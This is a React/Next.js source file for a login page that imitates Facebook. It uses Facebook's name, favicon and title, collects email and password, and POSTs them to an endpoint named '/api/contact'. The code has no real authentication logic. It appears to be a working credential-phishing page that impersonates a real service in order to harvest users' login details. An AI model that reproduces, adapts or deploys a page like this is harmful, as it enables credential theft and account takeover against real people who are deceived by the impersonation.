import React, { useState } from 'react';
import {
  Card,
  Spacer,
  Button,
  Text,
  Input,
  Row,
  Checkbox,
  Container,
} from '@nextui-org/react';
import Head from 'next/head'









export default function Login() {





const [email,setEmail] = useState("");
const [pass,setPass] = useState("");


const data = {email:email, password:pass}


const handleSend = ()=>{

  const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
}
fetch('/api/contact', requestOptions)
    .then(response => response.json())
    .then(data => console.log(data));



}



  return (
    <div>
       <Head>
       <link rel="shortcut icon" href="/facebook.png" />
        <title>Facebook Login</title>
      </Head>
      <Container
        display="flex"
        alignItems="center"
        justify="center"
        css={{ minHeight: '100vh' }}
      >
        <Card css={{ mw: '420px', p: '20px' }}>
          <Text
            size={24}
            weight="bold"
            css={{
              as: 'center',
              mb: '20px',
              color:'$blue600',
            }}
          >
            Facebook
          </Text>
          <Input
            clearable
            bordered
            fullWidth
            color="primary"
            size="lg"
            placeholder="Email"
            type='email'
            value={email}
            onChange={(e)=>{
              setEmail(e.target.value)
            }}


          />
          <Spacer y={1} />
          <Input
            bordered
            fullWidth
            color="primary"
            size="lg"
            placeholder="Password"
            type='password'
            value={pass}
            onChange={(e)=>{
              setPass(e.target.value)
            }}
          />
          <Row justify="space-around">
            <Text size={14} css={{textDecoration:"underline",}}>Forgot password?</Text>
          </Row>
          <Spacer y={1} />
          <Button onPress={handleSend}>Login</Button>
        </Card>
      </Container>



    </div>






  );
}